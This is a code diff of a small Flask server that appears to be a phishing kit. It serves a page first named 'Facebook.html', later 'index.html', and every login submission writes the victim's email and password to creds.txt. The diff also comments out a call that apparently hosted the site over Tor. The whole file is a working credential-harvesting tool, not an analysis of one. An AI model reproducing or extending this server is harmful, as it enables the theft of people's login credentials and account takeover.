@@ -1,7 +1,7 @@
 
 # from HostTor import VicksTor
-import VicksTor
-VicksTor.run_server('flask')
+# import VicksTor
+# VicksTor.run_server('flask')
 
 from flask import (
     Flask, 
@@ -9,7 +9,7 @@ from flask import (
     render_template, 
     send_from_directory
 )
-app = Flask(__name__)
+app = Flask(__name__, template_folder='./')
 
 def save_creds(email, password):
     with open('creds.txt', 'a') as f:
@@ -25,7 +25,7 @@ def login():
 
     # email = request.form['email']
     save_creds(email, password)
-    return render_template('Facebook.html')
+    return render_template('index.html')
 
 @app.route('/<path:filename>')  
 def send_file(filename):
@@ -33,7 +33,7 @@ def send_file(filename):
 
 @app.route('/')
 def hello_world():
-    return render_template('Facebook.html')
+    return render_template('index.html')
 
 if __name__ == '__main__':
     app.run(debug = False)
